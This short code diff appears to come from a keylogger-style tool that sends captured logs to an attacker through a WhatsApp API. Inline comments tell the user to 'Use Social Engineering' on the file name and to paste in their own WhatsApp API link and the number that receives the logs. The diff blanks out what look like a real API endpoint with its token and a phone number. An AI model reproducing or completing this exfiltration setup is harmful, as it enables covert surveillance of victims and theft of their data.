@@ -25,11 +25,11 @@ alphabets = ["1","2","3","4","5","6","7","8","9","0",".","A", "B", "C", "D", "E"
 
 
 
-file_name = "mak.txt"       # <--- Use Social Engineering ---> #
+file_name = ""       # <--- Use Social Engineering ---> #
 
-api_link = 'https://api.chat-api.com/instance119542/sendFile?token=e7z0o4dq7vtsbrnt'               # <--- Past The Link Of Your WhatsApp API ----->  #
+api_link = ''               # <--- Past The Link Of Your WhatsApp API ----->  #
 
-WhatsApp_number = "923445808330"       # <--- WhatsApp Number To Which Log send ----> #
+WhatsApp_number = ""       # <--- WhatsApp Number To Which Log send ----> #
 
 Time = 1                    # <--- Time For wait ----> #
 
